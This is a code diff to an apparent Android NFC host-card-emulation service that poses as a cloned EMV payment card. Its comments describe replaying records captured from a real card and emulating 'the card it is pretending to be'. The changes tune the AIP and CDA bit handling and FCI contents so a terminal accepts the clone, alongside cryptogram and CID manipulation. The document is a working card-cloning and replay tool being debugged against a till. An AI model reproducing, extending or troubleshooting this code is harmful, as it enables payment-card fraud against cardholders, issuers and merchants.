@@ -44,30 +44,40 @@ public class ShadowApduService extends HostApduService {
      * was byte 1 that was wrong there, not byte 2.
      *
      * 5800 is the working value for the test terminal: EMV mode, CVM supported,
-     * terminal risk management. No ODA bits - a clone cannot honour them.
+     * terminal risk management.
      *
-     * 5880 keeps qVSDC and adds mag-stripe back. The script app's card carried
-     * 5980 - qVSDC, CVM, TRM and CDA - and got a receipt, so a till that is
-     * happy with 5980 may also want the 0x80 bit present. Try 5880 if 5800
-     * stalls at the GPO.
+     * CHANGED to 5980. The reference app's GPO is 771A 8202 5980 9414 - qVSDC,
+     * CVM, TRM and the CDA bit - and the terminal read all six of its records
+     * off the back of it. CDA is now kept rather than cleared; see AIP_KEEP_MASK
+     * and the gpo() built path. Revert to 5800 if a till stalls at the GPO.
      */
-    private static final String DEFAULT_AIP = "5800";
+    private static final String DEFAULT_AIP = "5980";
 
     /**
-     * Keep-mask applied to byte 1 of whatever AIP is in force. Clears the ODA
-     * bits (SDA 0x40, DDA 0x20, CDA 0x01) and issuer auth (0x04), which a clone
-     * can never satisfy, and keeps mag-stripe (0x80), CV (0x10) and TRM (0x08).
+     * Keep-mask applied to byte 1 of whatever AIP is in force.
+     *
+     * 0xD9 keeps the mode bits - mag-stripe (0x80), qVSDC (0x40), CV (0x10),
+     * TRM (0x08) - and the CDA bit (0x01). It clears only DDA (0x20) and issuer
+     * authentication (0x04).
      *
      * FIX: this used to be 0x18, which also cleared 0x40 - and 0x40 is the
      * Mastercard qVSDC bit, so a typed 1040 was MACed over as 1000. Mode bits are
      * not ODA bits; they stay.
+     *
+     * CHANGED from 0xD8 to 0xD9 so the AIP the ARQC is computed over is the same
+     * AIP that goes out. With 0xD8 the CDA bit was cleared in the MAC input while
+     * the built path cleared it from the response too, and the two only agreed by
+     * accident.
      */
-    private static final byte AIP_KEEP_MASK = (byte) 0xD8;
+    private static final byte AIP_KEEP_MASK = (byte) 0xD9;
 
     /**
      * AIP byte 1 bit 1 - CDA supported. A clone cannot honour it: CDA needs the
-     * SDAD in 9F4B, signed with the ICC private key we do not have. gpo() clears
-     * this bit off whatever AIP it sends.
+     * SDAD in 9F4B, signed with the ICC private key we do not have.
+     *
+     * weakenAip() still clears it, and is kept for the replay path, but neither
+     * gpo() branch calls it any more - the reference card advertises 5980 with no
+     * 9F4B anywhere and the kernel tolerates it.
      *
      * VERIFIED against Sample_Mastercard_Reader_Logfile.md: that card's AIP is
      * 19 80, and 0x01 is the CDA bit. Byte 2's 0x80 is RFU and needs no clearing.
@@ -155,6 +165,10 @@ public class ShadowApduService extends HostApduService {
      *   The card decides TC offline, so no online session opens - but an
      *   online-PIN rule says the card expects a PIN block only an online session
      *   produces. The kernel ends up with a CVM it cannot perform and aborts.
+     *
+     * NOTE: the reference card's own list is 42 03 / 1E 03 / 1F 03 - online PIN
+     * WITH fallbacks to signature and no-CVM. A captured record carries that, so
+     * this constant only applies to a synthetic one.
      */
     private static final String CVMLIST = "00000000000000001F03";
 
@@ -175,8 +189,8 @@ public class ShadowApduService extends HostApduService {
      *
      * GATED. The script is OFF unless the card's 'usescript' pref says otherwise.
      *
-     * NOTE: a script that serves a GPO bypasses everything gpo() does - the CDA
-     * clear, the CID rewrite and the MSD framing.
+     * NOTE: a script that serves a GPO bypasses everything gpo() does - the CID
+     * rewrite and the MSD framing.
      */
     private static final String DEFAULT_SCRIPT =
             "# match=response, hex only. Longest match wins.\n"
@@ -604,6 +618,15 @@ public class ShadowApduService extends HostApduService {
         return tlv(outer, out.toByteArray());
     }
 
+    /**
+     * Rewrite the proprietary template of a captured FCI.
+     *
+     * 9F2A is no longer injected. The reference FCI is
+     * 6F1A8407A0000000041010A50F500D434849502042617365203031 - label only,
+     * no 9F2A - and the kernel still selected the applet and picked a kernel off
+     * the AID. Injecting it made this FCI five bytes longer than the card it is
+     * pretending to be.
+     */
     private byte[] patchA5(byte[] a5, byte[] aid) {
         TreeMap<Integer, byte[]> tags = new TreeMap<>();
         int i = 0;
@@ -615,7 +638,6 @@ public class ShadowApduService extends HostApduService {
             tags.put(t, Arrays.copyOfRange(a5, q[0], q[0] + l));
             i = q[0] + l;
         }
-        tags.put(0x9F2A, new byte[]{(byte) kernelFor(bytesToHex(aid))});
 
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         for (Map.Entry<Integer, byte[]> e : tags.entrySet()) {
@@ -731,8 +753,11 @@ public class ShadowApduService extends HostApduService {
      *     opens with it.
      *   - 9F07 is FFC0, matching the real card. FF00 also allowed cash.
      *
-     * 9F4A (SDA tag list) is deliberately absent - it is only required once an
-     * ODA bit is set, and every ODA bit is cleared.
+     * 9F4A (SDA tag list) is deliberately absent - a clone cannot satisfy it.
+     *
+     * NOTE: a captured record always wins over this. The reference card's SFI 1
+     * record 1 is a mag-stripe record (9F6C/9F62/9F63/56/9F6B/9F66), which this
+     * does not build at all.
      */
     private byte[] syntheticRecord() {
         String panS = pan();
@@ -914,6 +939,9 @@ public class ShadowApduService extends HostApduService {
      * freshly computed ARQC and went online into a decline - the card would have
      * contradicted its own CID one APDU later.
      *
+     * The CDA bit is no longer cleared from either path. The reference card
+     * answers 5980 and serves no 9F4B at all, and the kernel read every record.
+     *
      * watchForStall() is armed on the built path. A terminal can drop us after
      * the GPO without ever calling onDeactivated, and then the verdict was never
      * written at all - the log just stopped and looked like a dead app.
@@ -941,7 +969,6 @@ public class ShadowApduService extends HostApduService {
                 if (aip != null && aip.length >= 2) {
                     capturedIad = findTag(raw, 0x9F10);
 
-                    weakenAip(raw);
                     if (STRIP_AC) {
                         raw = stripAcTags(raw);
                         gpoCid = "(stripped)";
@@ -953,7 +980,7 @@ public class ShadowApduService extends HostApduService {
                     txnAip = capturedAip(raw);
                     cryptogramSent = !STRIP_AC;
                     tap("-- gpo replay aip=" + bytesToHex(txnAip)
-                            + " (CDA dropped, "
+                            + " ("
                             + (STRIP_AC ? "AC tags stripped" : "cid forced to " + gpoCid)
                             + ") len=" + raw.length
                             + (capturedIad == null ? "" : " iadKept=" + bytesToHex(capturedIad)));
@@ -970,7 +997,6 @@ public class ShadowApduService extends HostApduService {
         if (aip.length < 2) aip = hex(DEFAULT_AIP);
 
         byte[] used = new byte[]{aip[0], aip[1]};
-        used[0] &= (byte) ~AIP_CDA;
         txnAip = used;
 
         // PDOL data the terminal just sent - the GPO cryptogram covers this.
@@ -1065,6 +1091,7 @@ public class ShadowApduService extends HostApduService {
         } catch (Exception ignored) { }
     }
 
+    /** Kept for the replay path, no longer called. See AIP_CDA. */
     private static void weakenAip(byte[] tpl) {
         int[] pos = new int[1];
         int outer = readTag(tpl, pos);
@@ -1396,6 +1423,6 @@ public class ShadowApduService extends HostApduService {
             } catch (Exception ignored) { }
             popup(v);
         }
-        Log.d(TAG, "onDeactivated reason=" + reason + " | " + v);
+        Log.d("HCE", "onDeactivated reason=" + reason + " | " + v);
     }
 }
